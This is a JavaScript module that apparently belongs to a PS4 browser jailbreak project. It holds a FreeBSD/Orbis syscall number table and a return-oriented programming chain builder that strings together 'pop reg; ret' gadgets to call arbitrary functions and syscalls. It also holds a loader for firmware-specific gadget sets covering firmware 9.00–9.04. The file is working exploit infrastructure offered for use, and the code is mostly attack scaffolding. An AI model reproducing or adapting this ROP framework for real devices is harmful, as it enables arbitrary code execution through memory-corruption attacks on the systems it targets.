import { Int, lohi_from_one } from "/LapseHack/module/int64.mjs";
import { get_view_vector } from "/LapseHack/module/memtools.mjs";
import { Addr } from "/LapseHack/module/mem.mjs";
import * as config from "/LapseHack/config.mjs";
export const syscall_map = new Map(
    Object.entries({
        read: 3,
        write: 4,
        open: 5,
        close: 6,
        getpid: 20,
        setuid: 23,
        getuid: 24,
        accept: 30,
        pipe: 42,
        ioctl: 54,
        munmap: 73,
        mprotect: 74,
        fcntl: 92,
        socket: 97,
        connect: 98,
        bind: 104,
        setsockopt: 105,
        listen: 106,
        getsockopt: 118,
        fchmod: 124,
        socketpair: 135,
        fstat: 189,
        getdirentries: 196,
        __sysctl: 202,
        mlock: 203,
        munlock: 204,
        clock_gettime: 232,
        nanosleep: 240,
        sched_yield: 331,
        kqueue: 362,
        kevent: 363,
        rtprio_thread: 466,
        mmap: 477,
        ftruncate: 480,
        shm_open: 482,
        cpuset_getaffinity: 487,
        cpuset_setaffinity: 488,
        jitshm_create: 533,
        jitshm_alias: 534,
        evf_create: 538,
        evf_delete: 539,
        evf_set: 544,
        evf_clear: 545,
        set_vm_container: 559,
        dmem_container: 586,
        dynlib_dlsym: 591,
        dynlib_get_list: 592,
        dynlib_get_info: 593,
        dynlib_load_prx: 594,
        randomized_path: 602,
        budget_get_ptype: 610,
        thr_suspend_ucontext: 632,
        thr_resume_ucontext: 633,
        blockpool_open: 653,
        blockpool_map: 654,
        blockpool_unmap: 655,
        blockpool_batch: 657,
        aio_submit: 661,
        kexec: 661,
        aio_multi_delete: 662,
        aio_multi_wait: 663,
        aio_multi_poll: 664,
        aio_multi_cancel: 666,
        aio_submit_cmd: 669,
        blockpool_move: 673,
    }),
);

const argument_pops = ["pop rdi; ret", "pop rsi; ret", "pop rdx; ret", "pop rcx; ret", "pop r8; ret", "pop r9; ret"];
export class ChainBase {
    constructor(stack_size = 0x1000, upper_pad = 0x10000) {
        this._is_dirty = false;
        this.position = 0;
        const return_value = new Uint32Array(4);
        this._return_value = return_value;
        this.retval_addr = get_view_vector(return_value);
        const errno = new Uint32Array(1);
        this._errno = errno;
        this.errno_addr = get_view_vector(errno);
        const full_stack_size = upper_pad + stack_size;
        const stack_buffer = new ArrayBuffer(full_stack_size);
        const stack = new DataView(stack_buffer, upper_pad);
        this.stack = stack;
        this.stack_addr = get_view_vector(stack);
        this.stack_size = stack_size;
        this.full_stack_size = full_stack_size;
    }

    empty() {
        this.position = 0;
    }

    get is_dirty() {
        return this._is_dirty;
    }

    clean() {
        this._is_dirty = false;
    }

    dirty() {
        this._is_dirty = true;
    }

    check_allow_run() {
        if (this.position === 0) {
            throw Error("chain is empty");
        }
        if (this.is_dirty) {
            throw Error("chain already ran, clean it first");
        }
    }

    reset() {
        this.empty();
        this.clean();
    }

    get retval_int() {
        return this._return_value[0] | 0;
    }

    get retval() {
        return new Int(this._return_value[0], this._return_value[1]);
    }

    get retval_ptr() {
        return new Addr(this._return_value[0], this._return_value[1]);
    }

    set retval(value) {
        const values = lohi_from_one(value);
        const retval = this._return_value;
        retval[0] = values[0];
        retval[1] = values[1];
    }

    get retval_all() {
        const retval = this._return_value;
        return [new Int(retval[0], retval[1]), new Int(retval[2], retval[3])];
    }

    set retval_all(values) {
        const [a, b] = [lohi_from_one(values[0]), lohi_from_one(values[1])];
        const retval = this._return_value;
        retval[0] = a[0];
        retval[1] = a[1];
        retval[2] = b[0];
        retval[3] = b[1];
    }

    get errno() {
        return this._errno[0];
    }

    set errno(value) {
        this._errno[0] = value;
    }

    push_value(value) {
        const position = this.position;
        if (position >= this.stack_size) {
            throw Error(`no more space on the stack, pushed value: ${value}`);
        }

        const values = lohi_from_one(value);
        const stack = this.stack;
        stack.setUint32(position, values[0], true);
        stack.setUint32(position + 4, values[1], true);

        this.position += 8;
    }

    get_gadget(insn_str) {
        const addr = this.gadgets.get(insn_str);
        if (addr === undefined) {
            throw Error(`gadget not found: ${insn_str}`);
        }

        return addr;
    }

    push_gadget(insn_str) {
        this.push_value(this.get_gadget(insn_str));
    }

    push_call(func_addr, ...args) {
        if (args.length > 6) {
            throw TypeError("push_call() does not support functions that have more than 6 arguments");
        }

        for (let i = 0; i < args.length; i++) {
            this.push_gadget(argument_pops[i]);
            this.push_value(args[i]);
        }

        if ((this.position & (0x10 - 1)) !== 0) {
            this.push_gadget("ret");
        }

        if (typeof func_addr === "string") {
            this.push_gadget(func_addr);
        } else {
            this.push_value(func_addr);
        }
    }

    push_syscall(syscall_name, ...args) {
        if (typeof syscall_name !== "string") {
            throw TypeError(`syscall_name not a string: ${syscall_name}`);
        }

        const sysno = syscall_map.get(syscall_name);
        if (sysno === undefined) {
            throw Error(`syscall_name not found: ${syscall_name}`);
        }

        const syscall_addr = this.syscall_array[sysno];
        if (syscall_addr === undefined) {
            throw Error(`syscall number not in syscall_array: ${sysno}`);
        }

        this.push_call(syscall_addr, ...args);
    }

    static init_class(gadgets, syscall_array = []) {
        this.prototype.gadgets = gadgets;
        this.prototype.syscall_array = syscall_array;
    }

    run() {
        throw Error("not implemented");
    }

    push_end() {
        throw Error("not implemented");
    }

    push_get_errno() {
        throw Error("not implemented");
    }

    push_clear_errno() {
        throw Error("not implemented");
    }

    push_get_retval() {
        throw Error("not implemented");
    }

    push_get_retval_all() {
        throw Error("not implemented");
    }

    do_call(...args) {
        if (this.position) {
            throw Error("chain not empty");
        }
        try {
            this.push_call(...args);
            this.push_get_retval();
            this.push_get_errno();
            this.push_end();
            this.run();
        } finally {
            this.reset();
        }
    }

    call_void(...args) {
        this.do_call(...args);
    }

    call_int(...args) {
        this.do_call(...args);
        return this._return_value[0] | 0;
    }

    call(...args) {
        this.do_call(...args);
        const retval = this._return_value;
        return new Int(retval[0], retval[1]);
    }

    do_syscall(...args) {
        if (this.position) {
            throw Error("chain not empty");
        }
        try {
            this.push_syscall(...args);
            this.push_get_retval();
            this.push_get_errno();
            this.push_end();
            this.run();
        } finally {
            this.reset();
        }
    }

    syscall_void(...args) {
        this.do_syscall(...args);
    }

    syscall_int(...args) {
        this.do_syscall(...args);
        return this._return_value[0] | 0;
    }

    syscall(...args) {
        this.do_syscall(...args);
        const retval = this._return_value;
        return new Int(retval[0], retval[1]);
    }

    syscall_ptr(...args) {
        this.do_syscall(...args);
        const retval = this._return_value;
        return new Addr(retval[0], retval[1]);
    }

    do_syscall_clear_errno(...args) {
        if (this.position) {
            throw Error("chain not empty");
        }
        try {
            this.push_clear_errno();
            this.push_syscall(...args);
            this.push_get_retval();
            this.push_get_errno();
            this.push_end();
            this.run();
        } finally {
            this.reset();
        }
    }

    sysi(...args) {
        const errno = this._errno;
        this.do_syscall_clear_errno(...args);

        const err = errno[0];
        if (err !== 0) {
            throw Error(`syscall(${args[0]}) errno: ${err}`);
        }
        return this._return_value[0] | 0;
    }

    sys(...args) {
        const errno = this._errno;
        this.do_syscall_clear_errno(...args);

        const err = errno[0];
        if (err !== 0) {
            throw Error(`syscall(${args[0]}) errno: ${err}`);
        }

        const retval = this._return_value;
        return new Int(retval[0], retval[1]);
    }

    sysp(...args) {
        const errno = this._errno;
        this.do_syscall_clear_errno(...args);

        const err = errno[0];
        if (err !== 0) {
            throw Error(`syscall(${args[0]}) errno: ${err}`);
        }

        const retval = this._return_value;
        return new Addr(retval[0], retval[1]);
    }
}
export function get_gadget(map, insn_str) {
    const addr = map.get(insn_str);
    if (addr === undefined) {
        throw Error(`gadget not found: ${insn_str}`);
    }

    return addr;
}
function load_fw_specific(version) {
    if (version & 0x10000) {
        throw RangeError("PS5 not supported yet");
    }

    const value = version & 0xffff;
    if (value < 0x700) {
        throw RangeError("PS4 firmwares <7.00 aren't supported");
    }

    if (0x900 <= value && value < 0x950) {
        // 9.00, 9.03, 9.04
        return import("/LapseHack/rop/ps4/900.mjs");
    }

    throw RangeError("Firmware not supported");
}
export let gadgets = null;
export let libwebkit_base = null;
export let libkernel_base = null;
export let libc_base = null;
export let init_gadget_map = null;
export let Chain = null;
export async function init() {
    const module = await load_fw_specific(config.target);
    Chain = module.Chain;
    module.init(Chain);
    ({ gadgets, libwebkit_base, libkernel_base, libc_base, init_gadget_map } = module);
}